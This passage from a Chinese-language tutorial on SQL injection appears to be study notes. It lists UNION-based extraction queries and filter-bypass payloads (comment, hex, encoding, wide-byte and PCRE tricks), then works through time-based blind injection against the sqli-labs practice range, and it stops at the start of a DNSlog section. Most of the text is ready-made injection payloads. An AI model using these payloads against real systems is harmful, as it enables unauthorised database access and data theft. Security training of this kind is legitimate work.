punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span>  取当前用户名<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> card <span class="token keyword">where</span> id<span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">SELECT</span> GROUP_CONCAT<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">TABLES</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   取某个数据库的表名和列名<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> card <span class="token keyword">WHERE</span> ID <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> GROUP_CONCAT<span class="token punctuation">(</span>COLUMN_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">COLUMNS</span> <span class="token keyword">WHERE</span> TABLE_name<span class="token operator">=</span><span class="token string">'card'</span><span class="token comment">#   取列名</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> card <span class="token keyword">WHERE</span> ID <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> GROUP_CONCAT<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">FROM</span> card  <span class="token comment">#取数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-5-SQL注入绕过"><a href="#1-1-5-SQL注入绕过" class="headerlink" title="1.1.5 SQL注入绕过"></a>1.1.5 SQL注入绕过</h3><h5 id="1-绕过空格"><a href="#1-绕过空格" class="headerlink" title="1.绕过空格"></a>1.绕过空格</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1.</span>使用注释符<span class="token keyword">select</span> <span class="token comment">/**/</span> xxx <span class="token comment">/**/</span><span class="token keyword">from</span> <span class="token comment">/**/</span> xx<span class="token punctuation">;</span><span class="token number">2.</span> 俩个空格代替一个空格 ，利用tab代替空格，<span class="token operator">%</span>A0 <span class="token operator">=</span>空格<span class="token number">3.</span>使用浮点数<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">8.</span>o <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">8</span>E0 <span class="token keyword">union</span> <span class="token keyword">select</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2-括号绕过空格："><a href="#2-括号绕过空格：" class="headerlink" title="2. 括号绕过空格："></a>2. 括号绕过空格：</h5><p>如果空格被过滤，括号没有被过滤，可以用括号绕过</p><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> 这种方法常用来<span class="token keyword">time</span> based 盲注？id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token operator">and</span><span class="token punctuation">(</span>sleep<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>form<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>上面的方法既没有逗号也没有空格。猜解<span class="token keyword">database</span>（）第一个字符ascii码是否为<span class="token number">109</span>，若是则加载延时<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-引号绕过（使用十六进制）："><a href="#3-引号绕过（使用十六进制）：" class="headerlink" title="3.引号绕过（使用十六进制）："></a>3.引号绕过（使用十六进制）：</h5><p>会使用到引号的地方一般是在最后的<code>where</code>子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name  <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">"users"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。<br><code>　　users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name  <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-逗号绕过（使用from或者offset）"><a href="#4-逗号绕过（使用from或者offset）" class="headerlink" title="4.逗号绕过（使用from或者offset）"></a>4.逗号绕过（使用from或者offset）</h5><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<code>from to</code>的方式来解决：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>使用<span class="token keyword">join</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>     <span class="token comment">#等价于</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b使用<span class="token operator">like</span><span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">80</span>   <span class="token comment">#等价于</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'r%'</span>对于<span class="token keyword">limit</span> 可以使用<span class="token keyword">offset</span> 来绕过<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment"># 等价于下面这条SQL语句</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="5-比较符号（-lt-gt-）绕过（过滤了-lt-gt-：sqlmap盲注经常使用-lt-gt-，使用between的脚本）"><a href="#5-比较符号（-lt-gt-）绕过（过滤了-lt-gt-：sqlmap盲注经常使用-lt-gt-，使用between的脚本）" class="headerlink" title="5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）"></a>5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h5><p>使用greatest(),least():前者返回最大值，后者返回最小值</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到<code>greatest</code>来进行绕过了。<br>最常见的一个盲注的sql语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用<code>greatest</code>来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。<br>那么上面的这条sql语句可以使用<code>greatest</code>变为如下的子句:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> greatest<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>between a and b：</p><p>between 1 and 1; 等价于 =1</p><h5 id="6-or-and-xor-not-绕过"><a href="#6-or-and-xor-not-绕过" class="headerlink" title="6.or and xor not 绕过"></a>6.or and xor not 绕过</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">and</span><span class="token operator">=</span><span class="token operator">&amp;&amp;</span>  <span class="token operator">or</span><span class="token operator">=</span><span class="token operator">||</span><span class="token punctuation">.</span> <span class="token operator">xor</span><span class="token operator">=</span><span class="token operator">|</span> <span class="token operator">not</span><span class="token operator">=</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="7-绕过注释符号（-，–（后面跟一个空格））-过滤"><a href="#7-绕过注释符号（-，–（后面跟一个空格））-过滤" class="headerlink" title="7.绕过注释符号（#，–（后面跟一个空格）） 过滤"></a>7.绕过注释符号（#，–（后面跟一个空格）） 过滤</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,3||'</span><span class="token number">1</span>最后的<span class="token operator">or</span> <span class="token string">'1闭合查询语句的最后的单引号，或者：id=1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>'<span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="8-绕过"><a href="#8-绕过" class="headerlink" title="8.=绕过"></a>8.=绕过</h5><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h5 id="9-绕过-union，select，where"><a href="#9-绕过-union，select，where" class="headerlink" title="9.绕过 union，select，where"></a>9.绕过 union，select，where</h5><p>1.常用注释符绕过</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;&#x2F;，-- , &#x2F;**&#x2F;, #, --+, -- -, ;,%00,--a用法U&#x2F;**&#x2F; NION &#x2F;**&#x2F; SE&#x2F;**&#x2F; LECT &#x2F;**&#x2F;user，pwd from user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2.大小写绕过</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">UnIoN</span><span class="token comment">/**/</span><span class="token keyword">SeLeCT</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.内联注释绕过</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment">/*!UnIoN*/</span> <span class="token keyword">SeLeCT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token comment">/*!table_name*/</span><span class="token punctuation">)</span> <span class="token keyword">FrOM</span> <span class="token comment">/*!information_schema*/</span><span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token comment">/*!WHERE */</span><span class="token comment">/*!TaBlE_ScHeMa*/</span> <span class="token operator">like</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>双关键字绕过（若删除掉第一个匹配的union就能绕过）</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> 'UnionONSElectECT <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="10-通用绕过（编码-）"><a href="#10-通用绕过（编码-）" class="headerlink" title="10. 通用绕过（编码 ）"></a>10. 通用绕过（编码 ）</h5><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>即<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">31</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">31</span>，而Test也可以为<span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span>。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="11-等价函数绕过"><a href="#11-等价函数绕过" class="headerlink" title="11.等价函数绕过"></a>11.等价函数绕过</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">hex<span class="token punctuation">(</span><span class="token punctuation">)</span>、bin<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span> ascii<span class="token punctuation">(</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span>benchmark<span class="token punctuation">(</span><span class="token punctuation">)</span>concat_ws<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span>group_concat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、substr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span> substring<span class="token punctuation">(</span><span class="token punctuation">)</span>@<span class="token variable">@user</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>@<span class="token variable">@datadir</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span> datadir<span class="token punctuation">(</span><span class="token punctuation">)</span>举例：substring<span class="token punctuation">(</span><span class="token punctuation">)</span>和substr<span class="token punctuation">(</span><span class="token punctuation">)</span>无法使用时：?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">and</span><span class="token operator">+</span>ascii<span class="token punctuation">(</span>lower<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>pwd<span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>users<span class="token operator">+</span><span class="token keyword">limit</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">74</span>　或者：substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x70</span>strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="12-宽字节注入："><a href="#12-宽字节注入：" class="headerlink" title="12. 宽字节注入："></a>12. 宽字节注入：</h5><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。</p><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p><p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">27</span>union <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p><p>一般产生宽字节注入的PHP函数</p><p>1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 &#39; ，将 \  转为 \，将 “ 转为 &quot; 。用思路一。</p><p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p><p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p><p>3.mysql_real_escape_string()：转义下列字符：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">\x00     \n     \r     \     '     "     \x1a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="13-PCRE绕过"><a href="#13-PCRE绕过" class="headerlink" title="13. PCRE绕过"></a>13. PCRE绕过</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span><span class="token comment">/*'+'a'*1000001+'*/</span><span class="token keyword">select</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="1-2延时注入学习"><a href="#1-2延时注入学习" class="headerlink" title="1.2延时注入学习"></a>1.2延时注入学习</h2><h3 id="1-2-1-环境搭建"><a href="#1-2-1-环境搭建" class="headerlink" title="1.2.1 环境搭建"></a>1.2.1 环境搭建</h3><p>phpstudy：<a href="https://www.xp.cn/">https://www.xp.cn/</a></p><p>sql注入靶场：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>下载完文件后，将sql注入靶场押解在phpstudy/WWW/ 路径下，修改sql-connection下的sql配置文件，并运行phpstudy，访问相应目录即可</p><h3 id="1-2-2-ACSii表"><a href="#1-2-2-ACSii表" class="headerlink" title="1.2.2 ACSii表"></a>1.2.2 ACSii表</h3><h3 id="1-2-3-注入相关知识"><a href="#1-2-3-注入相关知识" class="headerlink" title="1.2.3 注入相关知识"></a>1.2.3 注入相关知识</h3><p>本此注入为第三关，SQL注入攻击采用的基本都为盲注以及其他注入，这里以mysql盲注为例；</p><p>延时注入：针对页面无变化，无法用布尔真假判断，无法报错的情况下注入 ，需要以下函数</p><p>Sleep()  延时</p><p>if（条件，true，false） 判断语句</p><p>mid（str，1，1） 指定字符串截取，截取字符开始长度，结束长度</p><p>ascii      转化为ascii 编码</p><h3 id="1-2-4-猜库名"><a href="#1-2-4-猜库名" class="headerlink" title="1.2.4 猜库名"></a>1.2.4 猜库名</h3><p>猜测database() 当前数据库名字，构造如下语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'and if(ascii(mid(database(),1,1))=1,sleep(5),1)--+'</span>mid函数截取<span class="token keyword">database</span>（）当前库库名第一个字符，判断第一个字符是否为<span class="token number">1</span>，<span class="token number">1</span>为ascii字符，如果第一个字符<span class="token operator">=</span>其中的一个ascii字符，那么就延时<span class="token number">5</span>秒，如果不等于则延时<span class="token number">1</span>秒<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用burp 爆破模块</p><p>模块一为第几个字符</p><p>模块二为对应的ascii码 1-127</p><p>爆破结果如图，对照ACSii表 得出databaes（）为security</p><h3 id="1-2-5-猜表名"><a href="#1-2-5-猜表名" class="headerlink" title="1.2.5 猜表名"></a>1.2.5 猜表名</h3><p>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。</p><p>下面开始猜测表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name frominformation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">113</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--+</span>查询第一个数据库表名的第一个字符是否大于<span class="token number">113</span>，如果大于停顿<span class="token number">10</span>秒<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-2-6-猜列名"><a href="#1-2-6-猜列名" class="headerlink" title="1.2.6 猜列名"></a>1.2.6 猜列名</h3><p>只需要将 select 语句里的</p><p>table_name 改 为 column_name 以 及 information_schemation.tables 改 为</p><p>information_schemation.columns</p><p>就可以了。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/Less-8/index.php?id=1'and if(ascii(mid((select column_name from information_</span><span class="token keyword">schema</span><span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">113</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-2-7-猜字段"><a href="#1-2-7-猜字段" class="headerlink" title="1.2.7 猜字段"></a>1.2.7 猜字段</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token keyword">order</span> <span class="token keyword">by</span> id <span class="token keyword">limit</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">117</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="1-3-DNSlog-盲注"><a href="#1-3-DNSlog-盲注" class="headerlink" title="1.3 DNSlog 盲注"></a>1.3 DNSlog 盲注</h2><h3 id="1-3-1-基础知识"><a href="#1-3-1-基础知识" class="headerlink" title="1.3.1 基础知识"></a>1.3.1 基础知识</h3><p>DNS(Domain Name System，域名系统)，因特网上作为域名和 IP 地址相互映射的</p><p>一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器</p><p>直接读取的 IP 数串。通过主机名，最终得到该主机名对应的 IP 地址的过程叫做</p><p>域名解析(或主机名解析)。DNS 协议运行在 UDP 协议之上，使用端口号 53。</p><p>Dnslog 就是存储在 DNS Server 上的域名信息，它记录着用户对域名 <a href="http://www.aaaa.com、/">www.aaaa.com、</a></p><p>bbbb.com.等的访问信息</p><h3 id="1-3-2-Dnslog-盲注原因"><a href="#1-3-2-Dnslog-盲注原因" class="headerlink" title="1.3.2 Dnslog 盲注原因"></a>1.3.2 Dnslog 盲注原因</h3><p>对于 SQL 